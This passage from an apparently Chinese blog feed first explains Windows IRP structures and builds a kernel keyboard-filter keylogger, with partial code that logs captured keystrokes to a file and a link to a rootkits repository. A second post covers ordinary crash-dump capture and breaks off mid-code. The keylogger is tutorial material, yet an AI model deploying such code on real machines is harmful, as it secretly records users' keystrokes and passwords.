class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">typedef struct _IRP &#123;</div><div class="line"> </div><div class="line">    PMDL MdlAddress;//MDL地址，内存描述符表。用来建立一块虚拟地址空间与物理地址页面之间的映射</div><div class="line"></div><div class="line">/*下面是一个共用体，很重要，联合的IRP，里面的SystemBuffer是指向应用层传递来的数据，采用的是DO_BUFFER_IO缓冲区拷贝的方式通信，速度慢，一般在DeviceIoControl小数据使用*/</div><div class="line">    union &#123;</div><div class="line">        struct _IRP *MasterIrp;</div><div class="line">        LONG IrpCount;</div><div class="line">        PVOID SystemBuffer;</div><div class="line">    &#125; AssociatedIrp;</div><div class="line"></div><div class="line"> /*里面有两个结构，一个Status是IRP完成的状态，一个是Infotmation存放数据传输的个数*/</div><div class="line">    IO_STATUS_BLOCK IoStatus;</div><div class="line"></div><div class="line">    CHAR StackCount;//栈的个数，可以由设备对象中StackSize的值决定</div><div class="line"></div><div class="line">    CHAR CurrentLocation;//当前的设备栈位置，很重要，过滤器驱动需要判断是否大于0，否则直接蓝屏处理</div><div class="line"></div><div class="line">    PKEVENT UserEvent;//构建IRP时很重要，同步事件，后面会讲到。</div><div class="line"></div><div class="line"></div><div class="line">       &#125; Overlay;</div><div class="line"></div><div class="line">    PVOID UserBuffer;//用户缓冲区，第三种方式和应用程序共享数据。这种速度最快，但也是最不安全，内核程序直接读取用户的内存，必</div><div class="line"></div><div class="line">须保证在相同设备上下文中访问才不会出错。  </div><div class="line">    union &#123;</div><div class="line"></div><div class="line">        struct &#123;</div><div class="line"></div><div class="line">            struct &#123;</div><div class="line"></div><div class="line">                union &#123;</div><div class="line"></div><div class="line"></div><div class="line">                    struct _IO_STACK_LOCATION *CurrentStackLocation;//IO设备栈指针，他是一个设备栈数组</div><div class="line">            </div><div class="line">                &#125;;</div><div class="line">            &#125;;</div><div class="line"></div><div class="line">        &#125; Overlay;</div><div class="line"></div><div class="line"></div><div class="line">    &#125; Tail;</div><div class="line"></div><div class="line">&#125; IRP, *PIRP;</div></pre></td></tr></table></figure></p>
<p>我们可以详细看下IO_STACK_LOCATION结构（截取一部分）：<br><img src="http://img.blog.csdn.net/20151109142946672" alt="这里写图片描述"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">typedef struct _IO_STACK_LOCATION &#123;</div><div class="line">    UCHAR MajorFunction;//IRP主功能码</div><div class="line">    UCHAR MinorFunction;//IRP次功能码，尤其是Pnp的IRP尤为重要</div><div class="line">    UCHAR Flags;</div><div class="line">    UCHAR Control;//DeviceControl的控制码</div><div class="line"></div><div class="line">   </div><div class="line">/*以下是一个联合体，非常重要，几乎所有的用户API的请求都在这里面体现出来，记录了所有的用户请求信息，例如读写的长度信息等。下面</div><div class="line"></div><div class="line">只保留了几个*/</div><div class="line">    union &#123;</div><div class="line"></div><div class="line"></div><div class="line">        struct &#123;</div><div class="line">            ULONG Length;</div><div class="line">            ULONG POINTER_ALIGNMENT Key;</div><div class="line">            LARGE_INTEGER ByteOffset;</div><div class="line">        &#125; Read;//NtReadFile（也即是ReadFile的实现的）</div><div class="line"></div><div class="line">        struct &#123;</div><div class="line">            ULONG Length;</div><div class="line">            ULONG POINTER_ALIGNMENT Key;</div><div class="line">            LARGE_INTEGER ByteOffset;</div><div class="line">        &#125; Write;//NtWriteFile</div><div class="line"></div><div class="line"></div><div class="line">        struct &#123;</div><div class="line">            ULONG OutputBufferLength;</div><div class="line">            ULONG POINTER_ALIGNMENT InputBufferLength;</div><div class="line">            ULONG POINTER_ALIGNMENT IoControlCode;</div><div class="line">            PVOID Type3InputBuffer;</div><div class="line">        &#125; DeviceIoControl;//NtDeviceIoControlFile</div><div class="line"></div><div class="line"></div><div class="line">        struct &#123;</div><div class="line">            PCM_RESOURCE_LIST AllocatedResources;</div><div class="line">            PCM_RESOURCE_LIST AllocatedResourcesTranslated;</div><div class="line">        &#125; StartDevice;//为什么保留这个，原因在于我自己是做硬件设备驱动的，而这个是启动设备的PnP能够获取到硬件的设备资源。如果</div><div class="line"></div><div class="line">是纯内核开发不需要关心。</div><div class="line"></div><div class="line"></div><div class="line">   </div><div class="line">        struct &#123;</div><div class="line">            PVOID Argument1;</div><div class="line">            PVOID Argument2;</div><div class="line">            PVOID Argument3;</div><div class="line">            PVOID Argument4;</div><div class="line">        &#125; Others;//这个的重要性在于，若没有列举的结构都可以用强类型转换这几个字段。很灵活</div><div class="line"></div><div class="line">    &#125; Parameters;</div><div class="line"></div><div class="line"></div><div class="line">    PDEVICE_OBJECT DeviceObject;//指向的设备对象，很重要，从设备对象中可以获得驱动对象，然后再得到相应的分发函数</div><div class="line"></div><div class="line"></div><div class="line">    PFILE_OBJECT FileObject;//文件对象，文件系统之类的信息安全内核编程很重要。</div><div class="line"> </div><div class="line">    PIO_COMPLETION_ROUTINE CompletionRoutine;</div><div class="line"></div><div class="line"> </div><div class="line">    PVOID Context;</div><div class="line"></div><div class="line">&#125; IO_STACK_LOCATION, *PIO_STACK_LOCATION;</div></pre></td></tr></table></figure></p>
<p>然后就是4中IRP的分发方式</p>
<ol>
<li>直接完成IRP，返回。</li>
<li>放入IRP队列中，调用StartIO完成IRP串行化。</li>
<li>传递IRP到下一层，由下一层（或者再下一层完成）并且不需要获得IRP完成的情况</li>
<li>传递IRP到下一层，同时需要得到获得下一层处理完IRP的信息</li>
</ol>
<p>4种IRP的完成方式：</p>
<ol>
<li>直接完成IRP：IoCompleteRequest()</li>
<li>放入IRP队列：IoMarkIrpPending()和IoStartPacket()</li>
<li>传递IRP到下一层：IoSkipCurrentIrpStackLocation()和IoCallDriver()</li>
<li>需要获取完成信息：IoCopyCurrentIrpStackLocationToNext()和IoCallDriver()</li>
</ol>
<p>根据上述，我们可以知道当有新的请求发出的时候，IRP被创建，在分配的IRP中为链中的每个驱动程序添加额外的空间，这个额外的空间就是上述结构中的IO_STACK_LOCATION<br>他在内存中的结构类似于：<br><img src="http://img.blog.csdn.net/20151109141517796" alt="这里写图片描述"><br>IRP的头部存储着当前IO_STACK_LOCATION的索引和当前数组的指针（索引没有0号成员），这样当消息向底层驱动传递的时候通过调用IoCallDriver（实际上就是递减当前堆栈位置索引，然后与0比较，然后将栈指针移动到前一个设备栈）<br>类似于这个过程：<br><img src="http://img.blog.csdn.net/20151109141834074" alt="这里写图片描述"><br>这样不仅可以将irp传递到底层驱动中去，也允许着更底层的驱动程序使用位于他之上驱动程序提供的任意参数（通过使用IoSkipCurrentIrpStackLocation()可以将指针回拨）。</p>
<p>#关于键盘过滤<br>之前自己写过一篇文章：<br><a href="http://venidic.com/2015/04/06/filter-%E9%94%AE%E7%9B%98%E8%BF%87%E6%BB%A4/">[filter]windows键盘过滤</a><br>里面只是将对应的按键消息通过dbgview显示出来，但是如果想要进一步将按键写入文件，就稍微显得麻烦些。因为IRP处理函数的IRQ级别为DISPATCH，他禁止了文件操作，所以如果想要记录下按键，则需要我们创建一个单独的线程来处理文件的写入。<br><del>[未完待续]下课要去抢饭啦</del><br>其他的大致思路和之前的文章一样，都是需要在底层键盘驱动上绑定我们自己的过滤驱动，然后设置IRP的完成回调函数，在IRP完成返回后获得键盘信息。<br>这个地方的过滤稍微复杂一点的就是需要讲键盘消息写入到一个文本文件而不是打印出来：<br>通过<strong>PsCreateSystemThread</strong>这个api来创建底层线程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">NTSTATUS PsCreateSystemThread(</div><div class="line">  _Out_     PHANDLE            ThreadHandle,</div><div class="line">  _In_      ULONG              DesiredAccess,</div><div class="line">  _In_opt_  POBJECT_ATTRIBUTES ObjectAttributes,</div><div class="line">  _In_opt_  HANDLE             ProcessHandle,</div><div class="line">  _Out_opt_ PCLIENT_ID         ClientId,</div><div class="line">  _In_      PKSTART_ROUTINE    StartRoutine,</div><div class="line">  _In_opt_  PVOID              StartContext</div><div class="line">);</div></pre></td></tr></table></figure>
<p>这里我们将DesiredAccess设置为ACCESS_MASK，将ObjectAttributes设置为NULL，讲processhandle设置为(HANDLE)0  (<em>代表着driver-created thread</em>)，同理我们将ClientId也设置为NULL，将后面两个参数分别指向我们的键盘记录线程和设备扩展。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">NTSTATUS status	= PsCreateSystemThread(&amp;hThread,(ACCESS_MASK)0,NULL,(HANDLE)0,NULL,ThreadKeyLogger,</div><div class="line">						pKeyboardDeviceExtension);</div><div class="line"></div><div class="line">	if(!NT_SUCCESS(status))</div><div class="line">		return status;</div><div class="line"></div><div class="line">	DbgPrint(&quot;Key logger thread created...\n&quot;);</div></pre></td></tr></table></figure>
<p>键盘的记录线程中，因为线程运行在内核中，所以只能通过自己来对线程进行卸载，于是我们在设备扩展程序中增加一个键盘线程运行的标志位来对线程的运行状态进行标记。当驱动卸载的时候，可以通过对标志位的改变来对线程进行终止。<br>设备扩展：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">typedef struct _DEVICE_EXTENSION </div><div class="line">&#123;</div><div class="line">	PDEVICE_OBJECT pKeyboardDevice; //设备栈中的键盘设备</div><div class="line">	PETHREAD pThreadObj;			//键盘记录线程</div><div class="line">	bool bThreadTerminate;		    //线程运行状态</div><div class="line">	HANDLE hLogFile;				//记录敲击键盘的文件句柄</div><div class="line">	KEY_STATE kState;				//特殊按键状态</div><div class="line"></div><div class="line">	</div><div class="line">	//同步和取键盘消息</div><div class="line">	KSEMAPHORE semQueue;</div><div class="line">	KSPIN_LOCK lockQueue;</div><div class="line">	LIST_ENTRY QueueListHead;</div><div class="line">&#125;DEVICE_EXTENSION, *PDEVICE_EXTENSION;</div></pre></td></tr></table></figure>
<p>我们继续回到键盘线程中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">VOID ThreadKeyLogger(IN PVOID pContext)</div><div class="line">&#123;</div><div class="line"></div><div class="line">	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;</div><div class="line">	PDEVICE_OBJECT pKeyboardDeviceOjbect = pKeyboardDeviceExtension-&gt;pKeyboardDevice;</div><div class="line"></div><div class="line">	PLIST_ENTRY pListEntry;</div><div class="line">	KEY_DATA* kData; //custom data structure used to hold scancodes in the linked list</div><div class="line">	</div><div class="line">	while(true)</div><div class="line">	&#123;</div><div class="line">		//通过信号量来标志数据是否到达队列</div><div class="line">		KeWaitForSingleObject(&amp;pKeyboardDeviceExtension-&gt;semQueue,Executive,KernelMode,FALSE,NULL);	</div><div class="line">	</div><div class="line">		pListEntry = ExInterlockedRemoveHeadList(&amp;pKeyboardDeviceExtension-&gt;QueueListHead,</div><div class="line">												&amp;pKeyboardDeviceExtension-&gt;lockQueue);</div><div class="line">		</div><div class="line">		//线程通过对标志位判断来终止自己</div><div class="line">		if(pKeyboardDeviceExtension-&gt;bThreadTerminate == true)</div><div class="line">		&#123;</div><div class="line">			PsTerminateSystemThread(STATUS_SUCCESS);</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		//通过CONTAINING_RECORD获得指向数据的指针</div><div class="line">		kData = CONTAINING_RECORD(pListEntry,KEY_DATA,ListEntry);</div><div class="line"></div><div class="line">		</div><div class="line">		char keys[3] = &#123;0&#125;;</div><div class="line">		//扫描码转换为按键码ConvertScanCodeToKeyCode(pKeyboardDeviceExtension,kData,keys);</div><div class="line"></div><div class="line">		</div><div class="line">		if(keys != 0)</div><div class="line">		&#123;</div><div class="line">			//判断写入文件是否存在</div><div class="line">			if(pKeyboardDeviceExtension-&gt;hLogFile != NULL) </div><div class="line">			&#123;	</div><div class="line">				IO_STATUS_BLOCK io_status;</div><div class="line">				DbgPrint(&quot;Writing scan code to file...\n&quot;);</div><div class="line">			    </div><div class="line">				NTSTATUS status = ZwWriteFile(pKeyboardDeviceExtension-&gt;hLogFile,NULL,NULL,NULL,</div><div class="line">					&amp;io_status,&amp;keys,strlen(keys),NULL,NULL);</div><div class="line"></div><div class="line">				if(status != STATUS_SUCCESS)</div><div class="line">						DbgPrint(&quot;Writing scan code to file...\n&quot;);</div><div class="line">				else</div><div class="line">					DbgPrint(&quot;Scan code &apos;%s&apos; successfully written to file.\n&quot;,keys);</div><div class="line">			&#125;</div><div class="line">		&#125;	</div><div class="line">	&#125;</div><div class="line">	return;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>为了保证线程的安全性，我们需要在驱动加载的时候设置一个自旋锁来保证不会出现死锁或者竞争引起的蓝屏，用信号量记录下工作队列中的项数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//Initialize the lock for the linked list queue</div><div class="line">	KeInitializeSpinLock(&amp;pKeyboardDeviceExtension-&gt;lockQueue);</div><div class="line"></div><div class="line">	//Initialize the work queue semaphore</div><div class="line">	KeInitializeSemaphore(&amp;pKeyboardDeviceExtension-&gt;semQueue, 0 , MAXLONG);</div></pre></td></tr></table></figure>
<p>在读例程中，我们为保证安全和通知也可以这样写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ExInterlockedInsertTailList(&amp;pKeyboardDeviceExtension-&gt;QueueListHead,</div><div class="line">			&amp;kData-&gt;ListEntry,</div><div class="line">			&amp;pKeyboardDeviceExtension-&gt;lockQueue);</div><div class="line"></div><div class="line">			//Increment the semaphore by 1 - no WaitForXXX after this call</div><div class="line">			KeReleaseSemaphore(&amp;pKeyboardDeviceExtension-&gt;semQueue,0,1,FALSE);</div></pre></td></tr></table></figure>
<p>主要和之前的代码稍微i不同的就是以上这些了，具体的代码参见<br><a href="https://github.com/venidic/codes/tree/master/rootkits/klog" target="_blank" rel="external">键盘记录驱动</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在看rootkits相关的资料，无意间又翻到了驱动过滤类的知识。分层驱动程序不仅可以截获数据，也可以在传递数据之前对其进行修改。&lt;br&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://venidic.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="filter" scheme="http://venidic.com/tags/filter/"/>
    
      <category term="rootkits" scheme="http://venidic.com/tags/rootkits/"/>
    
  </entry>
  
  <entry>
    <title>windows下dmp抓取方法总结</title>
    <link href="http://venidic.com/2015/10/09/windows%E4%B8%8Bdmp%E6%8A%93%E5%8F%96%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>http://venidic.com/2015/10/09/windows下dmp抓取方法总结/</id>
    <published>2015-10-09T09:36:03.000Z</published>
    <updated>2015-11-07T03:01:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近一段时间在帮一个同学调代码（当然是萌妹子，要不然谁会高兴看别人的代码啊喂！！！）发现妹子写的代码进程容易crash掉。其实作为windows开发员很头疼的就是程序编译通过但是在运行的时候crash掉。但是作为一个软件调试者，最基本的crash后dmp的抓取和分析是基本的技能了。这段时间趁着这个机会也回顾下这些知识然后总结下来。<br><a id="more"></a></p>
<p>#程序崩溃的种类</p>
<ul>
<li>程序崩溃后弹出提示框</li>
<li>程序直接退出</li>
<li>系统崩溃，蓝屏</li>
</ul>
<p>#第三方程序dmp抓取<br>一般运行第三方程序的时候可能会遇到程序宕掉的情况，但是此时我们又没有源码，如果想要重现dmp过程的话，通过对软件的逆向分析可以从正向的角度去跟踪程序crash的过程，当然也可以通过借助软件来辅助我们分析崩掉了的程序。<br>类似的工具有很多，之前也有人搜集过了：<br><a href="http://www.wintellect.com/devcenter/jrobbins/how-to-capture-a-minidump-let-me-count-the-ways" target="_blank" rel="external">How To Capture A Minidump</a><br>这里我简单的介绍下自己进程使用的一些工具：</p>
<p>##windows自带工具<br>对，你没看错，windows自带的工具很完善</p>
<ul>
<li>windows任务管理器</li>
</ul>
<p><img src="http://img.blog.csdn.net/20151106184958883" alt="这里写图片描述"></p>
<ul>
<li>windows注册表<br>在注册表项<br><strong>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting\ </strong>添加<br>LocalDumps项，<br><img src="http://img.blog.csdn.net/20151106190237075" alt="这里写图片描述"><br>DumpType：<br>0 = Create a custom dump<br>1 = Mini dump<br>2 = Full dump </li>
</ul>
<p>##windbg<br>windbg是经典的分析dmp的工具啦<br> 比较简单的，就是为windbg设置一个运行的参数。<br> <img src="http://img.blog.csdn.net/20151106192435963" alt="这里写图片描述"><br>然后windbg会弹出提示过框：<br><img src="http://img.blog.csdn.net/20151106192522028" alt="这里写图片描述"><br>然后此时在运行程序，如果程序崩溃，则会默认启动windbg加载，然后就可以通过windbg生成dmp文件：<br>.dump /参数 dmp路径<br>/m ：生成minidump，只保存系统信息，加载模块，进程及线程<br>/ma：尽可能多的信息，包括整的内存内容、句柄、未加载的模块，等等<br>/mFhutwd：带有数据段，非共享的读/写内存页和其他有用信息的minidump<br>这种生成dmp文件的方式是借助了windbg的附加，所以如果程序加入了反调试的话，就稍微显得复杂些。</p>
<p>##drwtsn32.exe<br>用法和windbg类似，可以先将他设置为默认的调试器<br>drwtsn32 [-i][-g][-p pid][-e event]<br>-i：讲drwtsn设置为默认的应用程序错误调试程序<br>-g: 被忽略，但作为windbg和ntsd的兼容而被提供<br>-p：pid为要调试的进程id<br>-e：event表示进程附加完成的事件</p>
<p>具体可参见：<br><a href="http://wenku.baidu.com/link?url=pvpcRmv-7qasikv4For9yJA3fU8LuCoLL1VTJdEnU5_P_RD_FTCMz4qdN1_WYRnetH69bBPVBH12Om3BM4APSrlw2m392mSIpw1-7o4i8LW" target="_blank" rel="external">drwtsn32使用手册</a></p>
<p>##google breakpad</p>
<blockquote>
<p>Google breakpad是一个非常实用的跨平台的崩溃转储和分析模块，他支持Windows，Linux和Mac和Solaris。由于他本身跨平台，所以很大的减少我们在平台移植时的工作，毕竟崩溃转储，每个平台下都不同，使用起来很难统一，而Google breakpad就帮我们做到了这一点，不管是哪个平台下的崩溃，都能够进行统一的分析。</p>
</blockquote>
<p>一般使用这种方式主要是为了跨平台，抓取dmp方式也分为进程内抓取和进程外抓取，可以参见：<br><a href="http://bigasp.com/archives/450" target="_blank" rel="external">Google Breakpad 完全解析</a></p>
<p>#程序自己生成dmp文件<br>上面多数应用与我们在分析第三方软件时崩溃所要抓取的dmp，但是在我们自己写程序的时候，可以让程序自动生成dmp文件以辅助我们以后的分析。<br>一般我们使用2个api就可以实现dmp的生成了。SetUnhandledExceptionFilter截获异常；MiniDumpWriteDump写dump文件。大体是先设置异常处理函数，这样当触发异常的时候回调我们的处理函数，然后在回调函数中完成对dmp的生成。<br>关于MiniDumpWriteDump:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">BOOL MiniDumpWriteDump (</div><div class="line">HANDLE hProcess,	//进程句柄</div><div class="line">DWORD ProcessId,	//进程ID</div><div class="line">HANDLE hFile,	//写入的文件句柄</div><div class="line">MINIDUMP_TYPE DumpType,	//dmp文件类型</div><div class="line">PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam, //指向MINIDUMP_EXCEPTION_INFORMATION 结构的指针</div><div class="line">PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, //null</div><div class="line">PMINIDUMP_CALLBACK_INFORMATION CallbackParam	//null</div><div class="line">);</div></pre></td></tr></table></figure>
<p>一般我们在异常回调的函数内这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">CString   strDumpFile; </div><div class="line">    strDumpFile.Format(&quot;%d&quot;,CTime::GetCurrentTime().GetTickCount());</div><div class="line">    strDumpFile   +=  &quot;.dmp &quot;; </div><div class="line">    HANDLE   hFile   =   CreateFile(strDumpFile,   GENERIC_WRITE,   FILE_SHARE_WRITE,   NULL,   CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,   NULL   );</div><div class="line"></div><div class="line">    if   (hFile!=INVALID_HANDLE_VALUE)</div><div class="line">    &#123; </div><div class="line">        MINIDUMP_EXCEPTION_INFORMATION   ExInfo; </div><div class="line"></div><div class="line">        ExInfo.ThreadId   =   ::GetCurrentThreadId();</div><div class="line">        ExInfo.ExceptionPointers   =   ExceptionInfo;</div><div class="line">        ExInfo.ClientPointers   =   NULL;</div><div class="line"></div><div class="line">        //   write   the   dump</div><div class="line">        BOOL   bOK   =   MiniDumpWriteDump(GetCurrentProcess(),   GetCurrentProcessId(),   hFile,   MiniDumpNormal,  &amp;ExInfo,   NULL,   NULL   );</div><div class="line">        CloseHandle(hFile); </div><div class="line">    &#125; </div><div class="line"></div><div class="line">    theApp.PostThreadMessage(WM_QUIT,0,0);</div><div class="line">    return EXCEPTION_EXECUTE_HANDLER;</div></pre></td></tr></table></figure>
<p>但是这样就会在想要生成dmp的每一次都要设置一次异常处理函数，为了方便，可以将其封装成一个类（<em>代码来自nightxie前辈</em>：）<br>NXLog.h：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#if !defined(AFX_NXLOG_H__DF9682BE_3FD5_4712_897D_22193AD50832__INCLUDED_)</div><div class="line">#define AFX_NXLOG_H__DF9682BE_3FD5_4712_897D_22193AD50832__INCLUDED_</div><div class="line"></div><div class="line">#include &lt;windows.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;DbgHelp.h&gt;</div><div class="line">#include &lt;tchar.h&gt;</div><div class="line"></div><div class="line">#pragma comment(lib, &quot;DbgHelp.lib&quot;)</div><div class="line">#if _MSC_VER &gt; 1000</div><div class="line">#pragma once</div><div class="line">#endif // _MSC_VER &gt; 1000</div><div class="line"></div><div class="line">class CNXExpRpt</div><div class="line">&#123;</div><div class="line">public:</div><div class="line">	CNXExpRpt();</div><div class="line">	~CNXExpRpt();</div><div class="line"></div><div class="line">	static LONG WINAPI NXUnhandledExceptionFilter(</div><div class="line">		PEXCEPTION_POINTERS pExceptionInfo );</div><div class="line"></div><div class="line"></div><div class="line">	static TCHAR m_szLogFileName[MAX_PATH];</div><div class="line">	static LPTOP_LEVEL_EXCEPTION_FILTER m_previousFilter;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">extern CNXExpRpt g_NXExpRpt;</div><div class="line">#endif // !defined(AFX_NXLOG_H__DF9682BE_3FD5_4712_897D_22193AD50832__INCLUDED_)</div></pre></td></tr></table></figure></p>
<p>NXLog.cpp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">// NXLog.cpp: implementation of the CNXLog class.</div><div class="line">//</div><div class="line">//////////////////////////////////////////////////////////////////////</div><div class="line"></div><div class="line">#include &quot;NXLog.h&quot;</div><div class="line"></div><div class="line">//////////////////////////////////////////////////////////////////////</div><div class="line">// Construction/Destruction</div><div class="line">//////////////////////////////////////////////////////////////////////</div><div class="line"></div><div class="line">TCHAR CNXExpRpt::m_szLogFileName[MAX_PATH];</div><div class="line">LPTOP_LEVEL_EXCEPTION_FILTER CNXExpRpt::m_previousFilter;</div><div class="line"></div><div class="line">CNXExpRpt g_NXExpRpt;</div><div class="line"></div><div class="line">CNXExpRpt::CNXExpRpt()</div><div class="line">&#123;</div><div class="line">	SYSTEMTIME	systime = &#123;0&#125;;</div><div class="line">	TCHAR		pDataBuffer[24] = &#123;0&#125;;</div><div class="line">	m_previousFilter = SetUnhandledExceptionFilter(NXUnhandledExceptionFilter);</div><div class="line"></div><div class="line">	GetModuleFileName(0, m_szLogFileName, MAX_PATH);</div><div class="line"></div><div class="line">	GetLocalTime(&amp;systime);</div><div class="line">	_stprintf(pDataBuffer, TEXT(&quot;%04d-%02d-%02d_%02d-%02d-%02d.dmp&quot;), </div><div class="line">		systime.wYear, systime.wMonth, systime.wDay, systime.wHour,</div><div class="line">		systime.wMinute, systime.wSecond);</div><div class="line"></div><div class="line">	PTSTR pszDot = _tcsrchr(m_szLogFileName, _T(&apos;\\&apos;));</div><div class="line">	if (pszDot)</div><div class="line">	&#123;</div><div class="line">		pszDot++;</div><div class="line">		if (_tcslen(pszDot) &gt;= 3)</div><div class="line">			_tcscpy(pszDot, pDataBuffer);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">CNXExpRpt::~CNXExpRpt()</div><div class="line">&#123;</div><div class="line">	SetUnhandledExceptionFilter(m_previousFilter);</div><div class="line">&#125;</div><div class="line"></div><div class="line">LONG WINAPI 